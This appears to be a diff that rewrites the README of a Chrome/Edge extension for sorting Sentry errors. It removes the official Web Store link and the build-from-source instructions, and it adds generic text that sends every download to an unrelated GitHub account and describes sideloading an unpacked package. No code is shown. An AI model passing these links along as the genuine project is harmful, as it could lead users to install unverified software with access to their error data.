@@ -1,186 +1,129 @@
-# Stack Sift
+# 🧩 stack-sift - Sort Sentry Errors with Local AI
 
-A Chrome/Edge extension that provides intelligent incident triage directly on Sentry issue pages. Runs **100% locally** in the browser — no backend, no external APIs, no cloud inference.
+[![Download stack-sift](https://img.shields.io/badge/Download-Stack--Sift-4B6EAF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Pyrochemical-civilunion999/stack-sift)
 
-## Install
+## 🚀 What stack-sift does
 
-**[Stack Sift — Chrome Web Store](https://chromewebstore.google.com/detail/stack-sift/hkgbhmljgofililfkalilpnbnjdnoone)** — add the extension from the store (Chrome and other Chromium browsers that support the Web Store).
+stack-sift is a Chrome extension that helps you classify Sentry errors in your browser.
 
-## Features
+It uses local machine learning to learn from your corrections as you work. It does not send your data to a backend. It runs on your device and helps you sort errors faster.
 
-- **Automatic classification** of errors into 8 categories: timeout, database, auth, runtime, validation, integration, infra, unknown
-- **In-browser ML** — trains and runs a neural network (TensorFlow.js MLP) entirely in the browser
-- **Adaptive learning** — learns from your corrections via text-similarity kNN + retrainable MLP
-- **Actionable recommendations** — pattern-matched suggestions specific to each error type
-- **Priority scoring** based on error category, environment, and route sensitivity
-- **Open in editor** — jump from Sentry to the exact source file in VS Code or Cursor
-- **Smart stack frame analysis** — skips error handlers and boilerplate, shows all navigable in-app frames
-- **64-feature extraction** — error type, Node.js error codes, stack structure, architectural patterns, route/HTTP, breadcrumbs, infra context, text metrics
+## 📥 Download and install
 
-## How It Works
+Use this link to visit the download page:
 
-When you open a Sentry issue page, Stack Sift:
+[Download stack-sift here](https://github.com/Pyrochemical-civilunion999/stack-sift)
 
-1. **Extracts** error data from the DOM (title, stack trace, breadcrumbs, environment, tags)
-2. **Builds 64 features** from the extracted data
-3. **Classifies** the incident using a multi-layer pipeline:
-   - Heuristic classifier (regex/keyword patterns)
-   - TensorFlow.js MLP (trained in-browser with synthetic + user feedback data)
-   - Adaptive kNN classifier (learns from user corrections via cosine text similarity)
-   - Merge logic that combines all signals with confidence weighting
-4. **Generates insights** — summary, recommendations, priority, stack frames
-5. **Renders a sidebar** injected into the Sentry page
+### Install on Windows
 
-### Learning System
+1. Open the download page in Chrome or Edge.
+2. Download the extension files or package from the repository.
+3. If you get a ZIP file, extract it to a folder on your PC.
+4. Open Chrome and go to the extensions page:
+   `chrome://extensions`
+5. Turn on **Developer mode** in the top-right corner.
+6. Click **Load unpacked**.
+7. Select the extracted stack-sift folder.
+8. Pin the extension to your toolbar so you can use it fast.
 
-Stack Sift gets smarter as you use it:
+## 🖥️ Before you start
 
-- **Exact match memory** — corrections for identical errors are remembered with 100% confidence
-- **Text similarity** — corrections influence similar errors via kNN with cosine similarity
-- **Retrain button** — click to retrain the MLP with your accumulated feedback (takes ~2 seconds)
-- **All data stays local** — feedback in `chrome.storage.local`, model in IndexedDB
+You need:
 
-### ML Pipeline
+- A Windows 10 or Windows 11 PC
+- Google Chrome or Microsoft Edge
+- A Sentry account or access to Sentry data
+- Enough disk space for the extension and local model files
+- A stable internet connection for the first download
 
-The classification model is a 3-layer MLP (64 → 32 → 16 → 8) that:
+## 🔧 How to use stack-sift
 
-- Ships with 2400 synthetic training examples embedded in the bundle
-- Can be trained/retrained entirely in the browser via TensorFlow.js
-- Weights user feedback 3x more than synthetic data during retraining
-- Persists the trained model in IndexedDB across sessions
+1. Open Sentry in your browser.
+2. Open the stack-sift extension.
+3. Let it read the error list and stack traces on the page.
+4. Review the suggested class for each error.
+5. Change the label if the suggestion is wrong.
+6. Keep using it so the model learns your choices.
 
-## Getting Started
+## 🧠 How it works
 
-```bash
-npm install
-npm run dev
-```
+stack-sift uses text from error names, stack traces, and event data.
 
-Load the extension in Chrome/Edge:
+It learns patterns from your past fixes and corrections. Over time, it gets better at grouping similar errors.
 
-1. Go to `chrome://extensions`
-2. Enable **Developer mode**
-3. Click **Load unpacked**
-4. Select the `build/chrome-mv3-dev` folder
+It keeps the model on your computer, so your data stays local.
 
-### Build for Production
+## ✨ What you can expect
 
-```bash
-npm run build
-```
+- Fast error sorting in the browser
+- Local training on your own corrections
+- No backend setup
+- Works with Sentry pages
+- Helps with incident triage
+- Uses stack trace data and error text
+- Built for day-to-day debugging
 
-### Run Tests
+## 🔍 Main use cases
 
-```bash
-npm test
-npm run test:watch
-```
+Use stack-sift when you want to:
 
-## Tech Stack
+- Group repeated Sentry errors
+- Find common error types
+- Reduce time spent on manual triage
+- Spot patterns in logs and stack traces
+- Keep error review work inside the browser
+- Learn from past review decisions
 
-| Technology | Purpose |
-|---|---|
-| [Plasmo](https://docs.plasmo.com/) | Browser extension framework |
-| React | Sidebar UI |
-| TypeScript (strict) | Type safety across the project |
-| [TensorFlow.js](https://www.tensorflow.org/js) | In-browser ML training and inference |
-| Vitest + jsdom | Testing with DOM mocking |
+## 🧩 Browser support
 
-## Project Structure
+stack-sift is built for:
 
-```
-src/
-  features/
-    dom/                  # DOM extraction from Sentry pages
-    classification/       # Rule-based heuristic classifier
-    insights/             # Summary, recommendations, priority, useful frames
-    ml/
-      buildFeatures/      # 64-feature extraction from ParsedIncident
-      runInference/       # TF.js inference + mock fallback
-      tfModel/            # MLP architecture, training, prediction
-      retrain/            # In-browser retraining orchestration
-      modelLoader/        # Model loading from IndexedDB
-      data/               # Synthetic training data, feature keys
-    feedback/
-      storage/            # Feedback CRUD in chrome.storage.local
-      adaptiveClassifier/ # kNN classifier with text similarity
-      textSimilarity/     # Tokenization, TF vectors, cosine similarity
-    editor/               # Open-in-editor: frame parsing, path mapping, URIs
-    sentry/               # Orchestration + Sentry page detection
-  shared/
-    types/                # Shared TypeScript interfaces
-  components/
-    sidebar/              # Sidebar UI components
-  contents/               # Plasmo content script entry + CSS
-```
+- Google Chrome
+- Microsoft Edge
 
-## Architecture
+It should also work in other Chromium-based browsers that support Chrome extensions.
 
-```
-Sentry DOM ──► Extractor ──► ParsedIncident
-                                   │
-                    ┌──────────────┼──────────────┐
-                    ▼              ▼               ▼
-               Heuristic     TF.js MLP       Adaptive kNN
-               Classifier   (in-browser)    (user feedback)
-                    │              │               │
-                    └──────┬───────┘───────────────┘
-                           ▼
-                    Merge Classification
-                           │
-              ┌────────────┼────────────┐
-              ▼            ▼            ▼
-          Summary    Recommendations  Priority
-              │            │            │
-              └────────────┼────────────┘
-                           ▼
-                       Sidebar UI
-                     ┌─────┴─────┐
-                     ▼           ▼
-               Retrain btn   Open in editor
-```
+## ⚙️ Basic setup tips
 
-## Classification Categories
+- Keep the extension pinned for easy access.
+- Refresh the Sentry page after you install it.
+- Use the same browser profile when you train it.
+- Review a set of errors with consistent labels.
+- Correct wrong labels so the model can learn faster.
 
-| Category | Signals |
-|---|---|
-| timeout | `etimedout`, `socket hang up`, `deadline exceeded`, `connect timeout` |
-| database | `queryfailederror`, `prisma`, `duplicate key`, `deadlock`, `typeorm` |
-| auth | `unauthorized`, `jwt expired`, `token invalid`, `forbidden`, `403` |
-| runtime | `cannot read properties of undefined`, `typeerror`, `referenceerror` |
-| validation | `zod`, `schema`, `invalid payload`, `class-validator`, `400` |
-| integration | `econnrefused`, `fetch failed`, `502`, `503`, `bad gateway` |
-| infra | `out of memory`, `enospc`, `sigkill`, `oom`, `enomem` |
-| unknown | No matching signals |
+## 📂 Project topics
 
-## Feature Categories (64 total)
+browser-extension, chrome-extension, client-side-ml, debugging, developer-tools, edge-extension, error-classification, error-monitoring, in-browser-ml, incident-triage, log-analysis, machine-learning, observability, on-device-ml, plasmo, react, sentry, stack-trace, tensorflowjs, typescript
 
-| Group | Count | Examples |
-|---|---|---|
-| Keyword booleans | 11 | hasTimeoutTerms, hasDatabaseTerms, isProduction |
-| Error type | 6 | isTypeError, isRangeError, isCustomError |
-| Node.js error codes | 8 | hasECONNREFUSED, hasENOENT, hasHTTPStatus5xx |
-| Stack trace structural | 11 | stackDepth, appFrameRatio, hasORMInStack |
-| Architectural patterns | 7 | hasControllerPattern, hasServicePattern |
-| Route / HTTP | 6 | isGET, isPOST, isAPIRoute, routeSegmentCount |
-| Breadcrumbs | 5 | breadcrumbCount, hasDBQueryBreadcrumbs |
-| Context / infra | 6 | isDocker, isLambda, hasCloudProvider |
-| Text metrics | 4 | titleWordCount, hasStackTrace, errorMessageLength |
+## 🛠️ Built with
 
-## Contributing
+- Chrome extension APIs
+- React
+- TypeScript
+- TensorFlow.js
+- Plasmo
+- In-browser machine learning
 
-Contributions are welcome! Feel free to open an issue or submit a pull request.
+## 🧪 Common setup checks
 
-1. Fork the repository
-2. Create your branch (`git checkout -b feature/my-feature`)
-3. Make your changes
-4. Run the tests (`npm test`)
-5. Commit (`git commit -m "Add my feature"`)
-6. Push (`git push origin feature/my-feature`)
-7. Open a Pull Request
+If the extension does not appear after install:
 
-If you're unsure about something, open an issue first to discuss it.
+1. Make sure you selected the unpacked folder, not a nested folder inside it.
+2. Check that Developer mode is on.
+3. Refresh the extensions page.
+4. Restart Chrome or Edge.
+5. Try loading the folder again.
 
-## License
+If the extension opens but does not read Sentry data:
 
-[MIT](./LICENSE)
+1. Open the Sentry page first.
+2. Refresh the page.
+3. Check that you are logged in to Sentry.
+4. Make sure the page has error data loaded.
+5. Open the extension again
+
+## 📌 Repository
+
+Primary download page:
+
+https://github.com/Pyrochemical-civilunion999/stack-sift
